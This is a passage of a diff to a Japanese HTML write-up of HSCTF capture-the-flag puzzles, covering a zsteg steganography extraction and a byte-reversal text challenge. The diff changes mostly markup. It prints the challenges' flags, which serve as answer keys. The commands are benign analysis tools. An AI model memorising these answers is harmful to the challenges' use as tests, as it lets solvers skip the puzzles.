 b4,bgr,lsb,xy       .. text: "EETDDUUUEETTUEDEDUETEDTDUDTEEUDEDEUTUEEEDUETEDTDUEDDDUUUETTEUETEUUTDDDTDUDEETUDUEETETDDDDUDEETUEUEDEEUEDDTTETDDDDUTEETUUUETDUUTEEDUEUDDEUUEEDDUEUEEDEUEEEETTTDDDDUDEEDTEUDTEEUDEDTUDUDEETUTEETUDUETDTUUDEDTDUEDEDUEUDTUDUEEDDTUTDDTDEEDDEUEEETUDUDEETTDEDTTUUETE"
 b4,rgba,lsb,xy      .. text: "EOE_DOUOU_T_UOEOE_D_EOUOUOTOTODOE_EOEOU_DOD_UOE_E_T_EOUOUOTOTODOE_D_DOUOU_T_T_TOE_E_UOU_D_DOTODOE_TOUOUOTOT_UOTOD_DODOUODOT_T_T_E_D_EOU_EODOT_TOD_DODOUOD_T_T_U_E_E_TOU_D_T_TOT_E_DOUOU_EOD_TOT_E_T_DOU_EOT_UOEOD_DODOUODOT_TOTOE_EOEOU_DOD_T_D_E_TOUOUOD_T_T_D_"
 </pre>
-
-<p><br />
-<div class="admonition tip"><p class="admonition-title">Tips</p></p>
-
+<p><br /></p>
+<div class="admonition tip"><p class="admonition-title">Tips</p>
 <p>zstegに<code>-l 0</code>を渡すと長さの制限にひっかからず、全部表示できる。</p>
-
-<p></div></p>
-
+</div>
 <p><b>$ zsteg logo.png -v b1,rgb,lsb,xy -l 0</b><br />
-b1,rgb,lsb,xy       .. text: &quot;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis non velit rutrum, porttitor est a, porttitor nisi. Aliquam placerat nibh ut diam faucibus, ut auctor felis sodales. Suspendisse egestas tempus libero, efficitur finibus orci congue sit amet. Sed accumsan mi sit amet porttitor pellentesque. Morbi et porta lacus. Nulla ligula justo, pulvinar imperdiet porta quis, accumsan et massa. In viverra varius eleifend. Ut congue feugiat leo a ultrices.\n\nUt risus ipsum, dictum id euismod nec, mattis eu dolor. In aliquam viverra congue. Mauris lacinia lectus quis erat porttitor, vitae iaculis mauris ultrices. Donec quis imperdiet mi, et fermentum purus. Mauris rhoncus sit amet ex quis gravida. In tempor, libero vel finibus tristique, velit est vestibulum est, non semper leo mauris vel enim. Nulla non orci pharetra, bibendum quam a, pharetra felis. Morbi tincidunt, mauris nec aliquam maximus, eros justo rutrum odio, in dapibus sem arcu blandit nunc. Mauris dapibus sem lorem, quis lacinia nunc consectetur pulvinar. Donec sapien erat, pulvinar non fermentum tempor, auctor pellentesque tortor.\n\nSuspendisse id vehicula enim. Cras ut enim sollicitudin, aliquam mauris eget, vehicula arcu. Morbi convallis sed nulla et pellentesque. Cras risus justo, fermentum eget ex ac, dictum dignissim magna. Nullam nec velit vel nulla varius gravida. Aliquam ac lorem tempor, venenatis nibh sed, ultricies urna. In fringilla hendrerit purus, tristique aliquam ipsum molestie vitae. Sed efficitur auctor lacus ac luctus.\n\nDonec id viverra augue. Vivamus null<code>hsctf{th4_l3est_s3gnific3nt_bbbbbbbbbbbbb}</code>a neque, iaculis quis urna eget, gravida commodo quam. Vestibulum porttitor justo in suscipit rutrum. Sed id tristique ipsum. Nulla vel porta nisl. Quisque leo quam, placerat id neque eu, ullamcorper facilisis lacus. Maecenas magna eros, sollicitudin id est a, fermentum elementum leo. Vestibulum porttitor urna eget bibendum interdum. Mauris eget consequat est. Aenean hendrerit eleifend finibus. Sed eu luctus nulla, non tristique nunc. Cras aliquet vehicula tincidunt. Maecenas nec semper ipsum.\n\nProin pulvinar lacus id malesuada bibendum. Mauris ac sapien eros. Sed non neque id ante porta finibus eget eget enim. Pellentesque placerat, neque sit amet dictum eleifend, tortor dolor porttitor ex, in vestibulum lacus tortor id purus. Phasellus varius nulla sed magna finibus aliquet. Proin eros metus, sodales vel enim eu, imperdiet pulvinar erat. Nunc quis iaculis dui. In cursus a urna in dapibus. Sed eu elementum quam. Vivamus ornare convallis leo sed mollis. Aenean sit amet nulla vel leo cursus dictum ac nec sem. Morbi nec ultrices felis.&quot;</p>
-
+b1,rgb,lsb,xy       .. text: &ldquo;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis non velit rutrum, porttitor est a, porttitor nisi. Aliquam placerat nibh ut diam faucibus, ut auctor felis sodales. Suspendisse egestas tempus libero, efficitur finibus orci congue sit amet. Sed accumsan mi sit amet porttitor pellentesque. Morbi et porta lacus. Nulla ligula justo, pulvinar imperdiet porta quis, accumsan et massa. In viverra varius eleifend. Ut congue feugiat leo a ultrices.\n\nUt risus ipsum, dictum id euismod nec, mattis eu dolor. In aliquam viverra congue. Mauris lacinia lectus quis erat porttitor, vitae iaculis mauris ultrices. Donec quis imperdiet mi, et fermentum purus. Mauris rhoncus sit amet ex quis gravida. In tempor, libero vel finibus tristique, velit est vestibulum est, non semper leo mauris vel enim. Nulla non orci pharetra, bibendum quam a, pharetra felis. Morbi tincidunt, mauris nec aliquam maximus, eros justo rutrum odio, in dapibus sem arcu blandit nunc. Mauris dapibus sem lorem, quis lacinia nunc consectetur pulvinar. Donec sapien erat, pulvinar non fermentum tempor, auctor pellentesque tortor.\n\nSuspendisse id vehicula enim. Cras ut enim sollicitudin, aliquam mauris eget, vehicula arcu. Morbi convallis sed nulla et pellentesque. Cras risus justo, fermentum eget ex ac, dictum dignissim magna. Nullam nec velit vel nulla varius gravida. Aliquam ac lorem tempor, venenatis nibh sed, ultricies urna. In fringilla hendrerit purus, tristique aliquam ipsum molestie vitae. Sed efficitur auctor lacus ac luctus.\n\nDonec id viverra augue. Vivamus null<code>hsctf{th4_l3est_s3gnific3nt_bbbbbbbbbbbbb}</code>a neque, iaculis quis urna eget, gravida commodo quam. Vestibulum porttitor justo in suscipit rutrum. Sed id tristique ipsum. Nulla vel porta nisl. Quisque leo quam, placerat id neque eu, ullamcorper facilisis lacus. Maecenas magna eros, sollicitudin id est a, fermentum elementum leo. Vestibulum porttitor urna eget bibendum interdum. Mauris eget consequat est. Aenean hendrerit eleifend finibus. Sed eu luctus nulla, non tristique nunc. Cras aliquet vehicula tincidunt. Maecenas nec semper ipsum.\n\nProin pulvinar lacus id malesuada bibendum. Mauris ac sapien eros. Sed non neque id ante porta finibus eget eget enim. Pellentesque placerat, neque sit amet dictum eleifend, tortor dolor porttitor ex, in vestibulum lacus tortor id purus. Phasellus varius nulla sed magna finibus aliquet. Proin eros metus, sodales vel enim eu, imperdiet pulvinar erat. Nunc quis iaculis dui. In cursus a urna in dapibus. Sed eu elementum quam. Vivamus ornare convallis leo sed mollis. Aenean sit amet nulla vel leo cursus dictum ac nec sem. Morbi nec ultrices felis.&rdquo;</p>
 <p><br />
 Flag: <code>hsctf{th4_l3est_s3gnific3nt_bbbbbbbbbbbbb}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="misc-the-real-reversal">[Misc]: The Real Reversal</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-24">Challenge</h3>
-
 <blockquote>
 <p>My friend gave me some fancy text, but it was reversed, and so I tried to reverse it but I think I messed it up further. Can you find out what the text says?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>reversed.txt</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-22">Solution</h3>
-
 <p>添付ファイルは、こんなやつです。</p>
-
 <pre>
 $ xxd reversed.txt | head -3
 00000000: 869a 9df0 989a 9df0 a09a 9df0 209d 9a9d  ............ ...
 00000010: f091 9a9d f092 9a9d f09c 9a9d f020 929a  ............. ..
 00000020: 9df0 9c9a 9df0 208c 9a9d f098 9a9d f098  ...... .........
 </pre>
-
 <p><br />
 バイトリバース</p>
-
 <pre>
 $ python -c 'print(open("reversed.txt", "rb").read()[::-1])' 
 .𝚖𝚞𝚛𝚘𝚋𝚊𝚕 𝚝𝚜𝚎 𝚍𝚒 𝚖𝚒𝚗𝚊 𝚝𝚒𝚕𝚕𝚘𝚖 𝚝𝚗𝚞𝚛𝚎𝚜𝚎𝚍 𝚊𝚒𝚌𝚒𝚏𝚏𝚘 𝚒𝚞𝚚 𝚊𝚙𝚕𝚞𝚌 𝚗𝚒 𝚝𝚗𝚞𝚜 ,𝚝𝚗𝚎𝚍𝚒𝚘𝚛𝚙 𝚗𝚘𝚗 𝚝𝚊𝚝𝚊𝚍𝚒𝚙𝚞𝚌 𝚝𝚊𝚌𝚎𝚊𝚌𝚌𝚘 𝚝𝚗𝚒𝚜 𝚛𝚞𝚎𝚝𝚙𝚎𝚌𝚡𝙴 .𝚛𝚞𝚝𝚊𝚒𝚛𝚊𝚙 𝚊𝚕𝚕𝚞𝚗 𝚝𝚊𝚒𝚐𝚞𝚏 𝚞𝚎 𝚎𝚛𝚘𝚕𝚘𝚍 𝚖𝚞𝚕𝚕𝚒𝚌 𝚎𝚜𝚜𝚎 𝚝𝚒𝚕𝚎𝚟 𝚎𝚝𝚊𝚝𝚙𝚞𝚕𝚘𝚟 𝚗𝚒 𝚝𝚒𝚛𝚎𝚍𝚗𝚎𝚑𝚎𝚛𝚙𝚎𝚛 𝚗𝚒 𝚛𝚘𝚕𝚘𝚍 𝚎𝚛𝚞𝚛𝚒 𝚎𝚝𝚞𝚊 𝚜𝚒𝚞𝙳 .𝚝𝚊𝚞𝚚𝚎𝚜𝚗𝚘𝚌 𝚘𝚍𝚘𝚖𝚖𝚘𝚌 𝚊𝚎 𝚡𝚎 𝚙𝚒𝚞𝚚𝚒𝚕𝚊 𝚝𝚞 𝚒𝚜𝚒𝚗 𝚜𝚒𝚛𝚘𝚋𝚊𝚕 𝚘𝚌𝚖𝚊𝚕𝚕𝚞 𝚗𝚘𝚒𝚝𝚊𝚝𝚒𝚌𝚛𝚎𝚡𝚎 𝚍𝚞𝚛𝚝𝚜𝚘𝚗 𝚜𝚒𝚞𝚚 ,𝚖𝚊𝚒𝚗𝚎𝚟 𝚖𝚒𝚗𝚒𝚖 𝚍𝚊 𝚖𝚒𝚗𝚎 𝚝𝚄 .𝚊𝚞𝚚𝚒𝚕𝚊 𝚊𝚗𝚐𝚊𝚖 𝚎𝚛𝚘𝚕𝚘𝚍 𝚝𝚎 𝚎𝚛𝚘𝚋𝚊𝚕 𝚝𝚞 𝚝𝚗𝚞𝚍𝚒𝚍𝚒𝚌𝚗𝚒 𝚛𝚘𝚙𝚖𝚎𝚝 𝚍𝚘𝚖𝚜𝚞𝚒𝚎 𝚘𝚍 𝚍𝚎𝚜 ,𝚝𝚒𝚕𝚎 𝚐𝚗𝚒𝚌𝚜𝚒𝚙𝚒𝚍𝚊 𝚛𝚞𝚝𝚎𝚝𝚌𝚎𝚜𝚗𝚘𝚌 ,𝚝𝚎𝚖𝚊 𝚝𝚒𝚜 𝚛𝚘𝚕𝚘𝚍 𝚖𝚞𝚜𝚙𝚒 𝚖𝚎𝚛𝚘𝙻 .𝚖𝚞𝚛𝚘𝚋𝚊𝚕 𝚝𝚜𝚎 𝚍𝚒 𝚖𝚒𝚗𝚊 𝚝𝚒𝚕𝚕𝚘𝚖 𝚝𝚗𝚞𝚛𝚎𝚜𝚎𝚍 𝚊𝚒𝚌𝚒𝚏𝚏𝚘 𝚒𝚞𝚚 𝚊𝚙𝚕𝚞𝚌 𝚗𝚒 𝚝𝚗𝚞𝚜 ,𝚝𝚗𝚎𝚍𝚒𝚘𝚛𝚙 𝚗𝚘𝚗 𝚝𝚊𝚝𝚊𝚍𝚒𝚙𝚞𝚌 𝚝𝚊𝚌𝚎𝚊𝚌𝚌𝚘 𝚝𝚗𝚒𝚜 𝚛𝚞𝚎𝚝𝚙𝚎𝚌𝚡𝙴 .𝚛𝚞𝚝𝚊𝚒𝚛𝚊𝚙 𝚊𝚕𝚕𝚞𝚗 𝚝𝚊𝚒𝚐𝚞𝚏 𝚞𝚎 𝚎𝚛𝚘𝚕𝚘𝚍 𝚖𝚞𝚕𝚕𝚒𝚌 𝚎𝚜𝚜𝚎 𝚝𝚒𝚕𝚎𝚟 𝚎𝚝𝚊𝚝𝚙𝚞𝚕𝚘𝚟 𝚗𝚒 𝚝𝚒𝚛𝚎𝚍𝚗𝚎𝚑𝚎𝚛𝚙𝚎𝚛 𝚗𝚒 𝚛𝚘𝚕𝚘𝚍 𝚎𝚛𝚞𝚛𝚒 𝚎𝚝𝚞𝚊 𝚜𝚒𝚞𝙳 .𝚝𝚊𝚞𝚚𝚎𝚜𝚗𝚘𝚌 𝚘𝚍𝚘𝚖𝚖𝚘𝚌 𝚊𝚎 𝚡𝚎 𝚙𝚒𝚞𝚚𝚒𝚕𝚊 𝚝𝚞 𝚒𝚜𝚒𝚗 𝚜𝚒𝚛𝚘𝚋𝚊𝚕 𝚘𝚌𝚖𝚊𝚕𝚕𝚞 𝚗𝚘𝚒𝚝𝚊𝚝𝚒𝚌𝚛𝚎𝚡𝚎 𝚍𝚞𝚛𝚝𝚜𝚘𝚗 𝚜𝚒𝚞𝚚 ,𝚖𝚊𝚒𝚗𝚎𝚟 𝚖𝚒𝚗𝚒𝚖 𝚍𝚊 𝚖𝚒𝚗𝚎 𝚝𝚄 .𝚊𝚞𝚚𝚒𝚕𝚊 𝚊𝚗𝚐𝚊𝚖 𝚎𝚛𝚘𝚕𝚘𝚍 𝚝𝚎 𝚎𝚛𝚘𝚋𝚊𝚕 𝚝𝚞 𝚝𝚗𝚞𝚍𝚒𝚍𝚒𝚌𝚗𝚒 𝚛𝚘𝚙𝚖𝚎𝚝 𝚍𝚘𝚖𝚜𝚞𝚒𝚎 𝚘𝚍 𝚍𝚎𝚜 ,𝚝𝚒𝚕𝚎 𝚐𝚗𝚒𝚌𝚜𝚒𝚙𝚒𝚍𝚊 𝚛𝚞𝚝𝚎𝚝𝚌𝚎𝚜𝚗𝚘𝚌 ,𝚝𝚎𝚖𝚊 𝚝𝚒𝚜 𝚛𝚘𝚕𝚘𝚍 𝚖𝚞𝚜𝚙𝚒 𝚖𝚎𝚛𝚘𝙻 .𝚜𝚛𝚎𝚝𝚝𝚎𝚕 𝚒𝚒𝚌𝚜𝚊 𝚛𝚊𝚕𝚞𝚐𝚎𝚛 𝚐𝚗𝚒𝚜𝚞 ,}𝚗𝚒𝚠_𝚎𝚑𝚝_𝚛𝚘𝚏_𝟾𝚏𝚝𝚞{𝚏𝚝𝚌𝚜𝚑 𝚜𝚒 𝚐𝚊𝚕𝚏 𝚎𝚑𝚃 .𝚖𝚞𝚛𝚘𝚋𝚊𝚕 𝚝𝚜𝚎 𝚍𝚒 𝚖𝚒𝚗𝚊 𝚝𝚒𝚕𝚕𝚘𝚖 𝚝𝚗𝚞𝚛𝚎𝚜𝚎𝚍 𝚊𝚒𝚌𝚒𝚏𝚏𝚘 𝚒𝚞𝚚 𝚊𝚙𝚕𝚞𝚌 𝚗𝚒 𝚝𝚗𝚞𝚜 ,𝚝𝚗𝚎𝚍𝚒𝚘𝚛𝚙 𝚗𝚘𝚗 𝚝𝚊𝚝𝚊𝚍𝚒𝚙𝚞𝚌 𝚝𝚊𝚌𝚎𝚊𝚌𝚌𝚘 𝚝𝚗𝚒𝚜 𝚛𝚞𝚎𝚝𝚙𝚎𝚌𝚡𝙴 .𝚛𝚞𝚝𝚊𝚒𝚛𝚊𝚙 𝚊𝚕𝚕𝚞𝚗 𝚝𝚊𝚒𝚐𝚞𝚏 𝚞𝚎 𝚎𝚛𝚘𝚕𝚘𝚍 𝚖𝚞𝚕𝚕𝚒𝚌 𝚎𝚜𝚜𝚎 𝚝𝚒𝚕𝚎𝚟 𝚎𝚝𝚊𝚝𝚙𝚞𝚕𝚘𝚟 𝚗𝚒 𝚝𝚒𝚛𝚎𝚍𝚗𝚎𝚑𝚎𝚛𝚙𝚎𝚛 𝚗𝚒 𝚛𝚘𝚕𝚘𝚍 𝚎𝚛𝚞𝚛𝚒 𝚎𝚝𝚞𝚊 𝚜𝚒𝚞𝙳 .𝚝𝚊𝚞𝚚𝚎𝚜𝚗𝚘𝚌 𝚘𝚍𝚘𝚖𝚖𝚘𝚌 𝚊𝚎 𝚡𝚎 𝚙𝚒𝚞𝚚𝚒𝚕𝚊 𝚝𝚞 𝚒𝚜𝚒𝚗 𝚜𝚒𝚛𝚘𝚋𝚊𝚕 𝚘𝚌𝚖𝚊𝚕𝚕𝚞 𝚗𝚘𝚒𝚝𝚊𝚝𝚒𝚌𝚛𝚎𝚡𝚎 𝚍𝚞𝚛𝚝𝚜𝚘𝚗 𝚜𝚒𝚞𝚚 ,𝚖𝚊𝚒𝚗𝚎𝚟 𝚖𝚒𝚗𝚒𝚖 𝚍𝚊 𝚖𝚒𝚗𝚎 𝚝𝚄 .𝚊𝚞𝚚𝚒𝚕𝚊 𝚊𝚗𝚐𝚊𝚖 𝚎𝚛𝚘𝚕𝚘𝚍 𝚝𝚎 𝚎𝚛𝚘𝚋𝚊𝚕 𝚝𝚞 𝚝𝚗𝚞𝚍𝚒𝚍𝚒𝚌𝚗𝚒 𝚛𝚘𝚙𝚖𝚎𝚝 𝚍𝚘𝚖𝚜𝚞𝚒𝚎 𝚘𝚍 𝚍𝚎𝚜 ,𝚝𝚒𝚕𝚎 𝚐𝚗𝚒𝚌𝚜𝚒𝚙𝚒𝚍𝚊 𝚛𝚞𝚝𝚎𝚝𝚌𝚎𝚜𝚗𝚘𝚌 ,𝚝𝚎𝚖𝚊 𝚝𝚒𝚜 𝚛𝚘𝚕𝚘𝚍 𝚖𝚞𝚜𝚙𝚒 𝚖𝚎𝚛𝚘𝙻 .𝚕𝚘𝚘𝚌 𝚘𝚜 𝚢𝚕𝚕𝚊𝚞𝚝𝚌𝚊 𝚜𝚒 𝚜𝚒𝚑𝚃 .𝚜𝚍𝚛𝚊𝚠𝚔𝚌𝚊𝚋 𝚜𝚒 𝚝𝚡𝚎𝚝 𝚢𝚖 𝚏𝚘 𝚕𝚕𝙰 .𝚕𝚘𝚘𝚌 𝚜𝚒 𝚜𝚒𝚑𝚝 𝚠𝚘𝚆
 </pre>
-
 <p><br />
 さらにrevで反転</p>
-
 <pre>
 $ python -c 'print(open("reversed.txt", "rb").read()[::-1])' | rev
 
 𝚆𝚘𝚠 𝚝𝚑𝚒𝚜 𝚒𝚜 𝚌𝚘𝚘𝚕. 𝙰𝚕𝚕 𝚘𝚏 𝚖𝚢 𝚝𝚎𝚡𝚝 𝚒𝚜 𝚋𝚊𝚌𝚔𝚠𝚊𝚛𝚍𝚜. 𝚃𝚑𝚒𝚜 𝚒𝚜 𝚊𝚌𝚝𝚞𝚊𝚕𝚕𝚢 𝚜𝚘 𝚌𝚘𝚘𝚕. 𝙻𝚘𝚛𝚎𝚖 𝚒𝚙𝚜𝚞𝚖 𝚍𝚘𝚕𝚘𝚛 𝚜𝚒𝚝 𝚊𝚖𝚎𝚝, 𝚌𝚘𝚗𝚜𝚎𝚌𝚝𝚎𝚝𝚞𝚛 𝚊𝚍𝚒𝚙𝚒𝚜𝚌𝚒𝚗𝚐 𝚎𝚕𝚒𝚝, 𝚜𝚎𝚍 𝚍𝚘 𝚎𝚒𝚞𝚜𝚖𝚘𝚍 𝚝𝚎𝚖𝚙𝚘𝚛 𝚒𝚗𝚌𝚒𝚍𝚒𝚍𝚞𝚗𝚝 𝚞𝚝 𝚕𝚊𝚋𝚘𝚛𝚎 𝚎𝚝 𝚍𝚘𝚕𝚘𝚛𝚎 𝚖𝚊𝚐𝚗𝚊 𝚊𝚕𝚒𝚚𝚞𝚊. 𝚄𝚝 𝚎𝚗𝚒𝚖 𝚊𝚍 𝚖𝚒𝚗𝚒𝚖 𝚟𝚎𝚗𝚒𝚊𝚖, 𝚚𝚞𝚒𝚜 𝚗𝚘𝚜𝚝𝚛𝚞𝚍 𝚎𝚡𝚎𝚛𝚌𝚒𝚝𝚊𝚝𝚒𝚘𝚗 𝚞𝚕𝚕𝚊𝚖𝚌𝚘 𝚕𝚊𝚋𝚘𝚛𝚒𝚜 𝚗𝚒𝚜𝚒 𝚞𝚝 𝚊𝚕𝚒𝚚𝚞𝚒𝚙 𝚎𝚡 𝚎𝚊 𝚌𝚘𝚖𝚖𝚘𝚍𝚘 𝚌𝚘𝚗𝚜𝚎𝚚𝚞𝚊𝚝. 𝙳𝚞𝚒𝚜 𝚊𝚞𝚝𝚎 𝚒𝚛𝚞𝚛𝚎 𝚍𝚘𝚕𝚘𝚛 𝚒𝚗 𝚛𝚎𝚙𝚛𝚎𝚑𝚎𝚗𝚍𝚎𝚛𝚒𝚝 𝚒𝚗 𝚟𝚘𝚕𝚞𝚙𝚝𝚊𝚝𝚎 𝚟𝚎𝚕𝚒𝚝 𝚎𝚜𝚜𝚎 𝚌𝚒𝚕𝚕𝚞𝚖 𝚍𝚘𝚕𝚘𝚛𝚎 𝚎𝚞 𝚏𝚞𝚐𝚒𝚊𝚝 𝚗𝚞𝚕𝚕𝚊 𝚙𝚊𝚛𝚒𝚊𝚝𝚞𝚛. 𝙴𝚡𝚌𝚎𝚙𝚝𝚎𝚞𝚛 𝚜𝚒𝚗𝚝 𝚘𝚌𝚌𝚊𝚎𝚌𝚊𝚝 𝚌𝚞𝚙𝚒𝚍𝚊𝚝𝚊𝚝 𝚗𝚘𝚗 𝚙𝚛𝚘𝚒𝚍𝚎𝚗𝚝, 𝚜𝚞𝚗𝚝 𝚒𝚗 𝚌𝚞𝚕𝚙𝚊 𝚚𝚞𝚒 𝚘𝚏𝚏𝚒𝚌𝚒𝚊 𝚍𝚎𝚜𝚎𝚛𝚞𝚗𝚝 𝚖𝚘𝚕𝚕𝚒𝚝 𝚊𝚗𝚒𝚖 𝚒𝚍 𝚎𝚜𝚝 𝚕𝚊𝚋𝚘𝚛𝚞𝚖. 𝚃𝚑𝚎 𝚏𝚕𝚊𝚐 𝚒𝚜 𝚑𝚜𝚌𝚝𝚏{𝚞𝚝𝚏𝟾_𝚏𝚘𝚛_𝚝𝚑𝚎_𝚠𝚒𝚗}, 𝚞𝚜𝚒𝚗𝚐 𝚛𝚎𝚐𝚞𝚕𝚊𝚛 𝚊𝚜𝚌𝚒𝚒 𝚕𝚎𝚝𝚝𝚎𝚛𝚜. 𝙻𝚘𝚛𝚎𝚖 𝚒𝚙𝚜𝚞𝚖 𝚍𝚘𝚕𝚘𝚛 𝚜𝚒𝚝 𝚊𝚖𝚎𝚝, 𝚌𝚘𝚗𝚜𝚎𝚌𝚝𝚎𝚝𝚞𝚛 𝚊𝚍𝚒𝚙𝚒𝚜𝚌𝚒𝚗𝚐 𝚎𝚕𝚒𝚝, 𝚜𝚎𝚍 𝚍𝚘 𝚎𝚒𝚞𝚜𝚖𝚘𝚍 𝚝𝚎𝚖𝚙𝚘𝚛 𝚒𝚗𝚌𝚒𝚍𝚒𝚍𝚞𝚗𝚝 𝚞𝚝 𝚕𝚊𝚋𝚘𝚛𝚎 𝚎𝚝 𝚍𝚘𝚕𝚘𝚛𝚎 𝚖𝚊𝚐𝚗𝚊 𝚊𝚕𝚒𝚚𝚞𝚊. 𝚄𝚝 𝚎𝚗𝚒𝚖 𝚊𝚍 𝚖𝚒𝚗𝚒𝚖 𝚟𝚎𝚗𝚒𝚊𝚖, 𝚚𝚞𝚒𝚜 𝚗𝚘𝚜𝚝𝚛𝚞𝚍 𝚎𝚡𝚎𝚛𝚌𝚒𝚝𝚊𝚝𝚒𝚘𝚗 𝚞𝚕𝚕𝚊𝚖𝚌𝚘 𝚕𝚊𝚋𝚘𝚛𝚒𝚜 𝚗𝚒𝚜𝚒 𝚞𝚝 𝚊𝚕𝚒𝚚𝚞𝚒𝚙 𝚎𝚡 𝚎𝚊 𝚌𝚘𝚖𝚖𝚘𝚍𝚘 𝚌𝚘𝚗𝚜𝚎𝚚𝚞𝚊𝚝. 𝙳𝚞𝚒𝚜 𝚊𝚞𝚝𝚎 𝚒𝚛𝚞𝚛𝚎 𝚍𝚘𝚕𝚘𝚛 𝚒𝚗 𝚛𝚎𝚙𝚛𝚎𝚑𝚎𝚗𝚍𝚎𝚛𝚒𝚝 𝚒𝚗 𝚟𝚘𝚕𝚞𝚙𝚝𝚊𝚝𝚎 𝚟𝚎𝚕𝚒𝚝 𝚎𝚜𝚜𝚎 𝚌𝚒𝚕𝚕𝚞𝚖 𝚍𝚘𝚕𝚘𝚛𝚎 𝚎𝚞 𝚏𝚞𝚐𝚒𝚊𝚝 𝚗𝚞𝚕𝚕𝚊 𝚙𝚊𝚛𝚒𝚊𝚝𝚞𝚛. 𝙴𝚡𝚌𝚎𝚙𝚝𝚎𝚞𝚛 𝚜𝚒𝚗𝚝 𝚘𝚌𝚌𝚊𝚎𝚌𝚊𝚝 𝚌𝚞𝚙𝚒𝚍𝚊𝚝𝚊𝚝 𝚗𝚘𝚗 𝚙𝚛𝚘𝚒𝚍𝚎𝚗𝚝, 𝚜𝚞𝚗𝚝 𝚒𝚗 𝚌𝚞𝚕𝚙𝚊 𝚚𝚞𝚒 𝚘𝚏𝚏𝚒𝚌𝚒𝚊 𝚍𝚎𝚜𝚎𝚛𝚞𝚗𝚝 𝚖𝚘𝚕𝚕𝚒𝚝 𝚊𝚗𝚒𝚖 𝚒𝚍 𝚎𝚜𝚝 𝚕𝚊𝚋𝚘𝚛𝚞𝚖. 𝙻𝚘𝚛𝚎𝚖 𝚒𝚙𝚜𝚞𝚖 𝚍𝚘𝚕𝚘𝚛 𝚜𝚒𝚝 𝚊𝚖𝚎𝚝, 𝚌𝚘𝚗𝚜𝚎𝚌𝚝𝚎𝚝𝚞𝚛 𝚊𝚍𝚒𝚙𝚒𝚜𝚌𝚒𝚗𝚐 𝚎𝚕𝚒𝚝, 𝚜𝚎𝚍 𝚍𝚘 𝚎𝚒𝚞𝚜𝚖𝚘𝚍 𝚝𝚎𝚖𝚙𝚘𝚛 𝚒𝚗𝚌𝚒𝚍𝚒𝚍𝚞𝚗𝚝 𝚞𝚝 𝚕𝚊𝚋𝚘𝚛𝚎 𝚎𝚝 𝚍𝚘𝚕𝚘𝚛𝚎 𝚖𝚊𝚐𝚗𝚊 𝚊𝚕𝚒𝚚𝚞𝚊. 𝚄𝚝 𝚎𝚗𝚒𝚖 𝚊𝚍 𝚖𝚒𝚗𝚒𝚖 𝚟𝚎𝚗𝚒𝚊𝚖, 𝚚𝚞𝚒𝚜 𝚗𝚘𝚜𝚝𝚛𝚞𝚍 𝚎𝚡𝚎𝚛𝚌𝚒𝚝𝚊𝚝𝚒𝚘𝚗 𝚞𝚕𝚕𝚊𝚖𝚌𝚘 𝚕𝚊𝚋𝚘𝚛𝚒𝚜 𝚗𝚒𝚜𝚒 𝚞𝚝 𝚊𝚕𝚒𝚚𝚞𝚒𝚙 𝚎𝚡 𝚎𝚊 𝚌𝚘𝚖𝚖𝚘𝚍𝚘 𝚌𝚘𝚗𝚜𝚎𝚚𝚞𝚊𝚝. 𝙳𝚞𝚒𝚜 𝚊𝚞𝚝𝚎 𝚒𝚛𝚞𝚛𝚎 𝚍𝚘𝚕𝚘𝚛 𝚒𝚗 𝚛𝚎𝚙𝚛𝚎𝚑𝚎𝚗𝚍𝚎𝚛𝚒𝚝 𝚒𝚗 𝚟𝚘𝚕𝚞𝚙𝚝𝚊𝚝𝚎 𝚟𝚎𝚕𝚒𝚝 𝚎𝚜𝚜𝚎 𝚌𝚒𝚕𝚕𝚞𝚖 𝚍𝚘𝚕𝚘𝚛𝚎 𝚎𝚞 𝚏𝚞𝚐𝚒𝚊𝚝 𝚗𝚞𝚕𝚕𝚊 𝚙𝚊𝚛𝚒𝚊𝚝𝚞𝚛. 𝙴𝚡𝚌𝚎𝚙𝚝𝚎𝚞𝚛 𝚜𝚒𝚗𝚝 𝚘𝚌𝚌𝚊𝚎𝚌𝚊𝚝 𝚌𝚞𝚙𝚒𝚍𝚊𝚝𝚊𝚝 𝚗𝚘𝚗 𝚙𝚛𝚘𝚒𝚍𝚎𝚗𝚝, 𝚜𝚞𝚗𝚝 𝚒𝚗 𝚌𝚞𝚕𝚙𝚊 𝚚𝚞𝚒 𝚘𝚏𝚏𝚒𝚌𝚒𝚊 𝚍𝚎𝚜𝚎𝚛𝚞𝚗𝚝 𝚖𝚘𝚕𝚕𝚒𝚝 𝚊𝚗𝚒𝚖 𝚒𝚍 𝚎𝚜𝚝 𝚕𝚊𝚋𝚘𝚛𝚞𝚖.
 </pre>
-
 <p>FLAG: <code>hsctf{utf8_for_the_win}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
-<hr />
-
+<hr>
 <p><br /><br />
 <br /><br /></p>
 
